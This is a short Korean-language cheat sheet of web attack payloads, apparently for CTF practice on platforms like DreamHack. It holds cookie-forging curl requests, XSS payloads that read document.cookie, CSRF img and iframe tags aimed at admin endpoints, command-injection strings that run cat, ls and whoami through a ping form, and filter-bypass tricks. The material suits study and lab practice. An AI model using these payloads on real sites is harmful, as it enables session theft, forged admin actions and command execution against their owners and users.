# 🚀 웹 해킹 공격 치트시트

## Cookie Manipulation
```bash
# 브라우저: F12 > Application > Cookies > username=admin
curl -H "Cookie: username=admin" http://target/
```

## XSS (Cross-Site Scripting)
```html
<!-- 쿠키 탈취 페이로드 -->
<script>fetch('/memo?memo=' + encodeURIComponent(document.cookie));</script>

<!-- 대안 페이로드 -->
<img src=x onerror="fetch('/memo?memo='+btoa(document.cookie))">
```

```bash
# Base64 디코딩
echo "ZmxhZz1ESHs..." | base64 -d
```

## CSRF (Cross-Site Request Forgery)
```html
<!-- HTML 필터 우회 -->
<img src="/admin/notice_flag?userid=admin">
<iframe src="/admin/sensitive_action"></iframe>
```

## Command Injection
```bash
# 명령어 종료 후 새 명령어 실행
"; cat flag.txt; echo "
"; ls -la; echo "
"; whoami; echo "

# 실제 공격
curl -X POST http://target/ping -d 'host="; cat flag.py; echo "'
```

## 공통 디버깅 명령어
```bash
# 서버 응답 확인
curl -s -i http://target/

# POST 데이터 전송
curl -X POST http://target/ -d "param=value"

# 쿠키와 함께 요청
curl -H "Cookie: name=value" http://target/

# 결과를 파일로 저장
curl http://target/ > result.html
```

## 보안 우회 기법
- **클라이언트 검증**: HTML pattern 무시하고 직접 POST
- **필터링 우회**: `<img>` 대신 `<IFrame>`, `script` 대신 `SCRIPT`
- **인코딩**: Base64, URL 인코딩 활용
- **대소문자**: 필터가 대소문자 구분할 때

## 플래그 형식
- DreamHack: `DH{...}`
- 일반 CTF: `CTF{...}`, `FLAG{...}`

---
*복습 시 이 치트시트와 함께 상세 가이드를 참조하세요!*
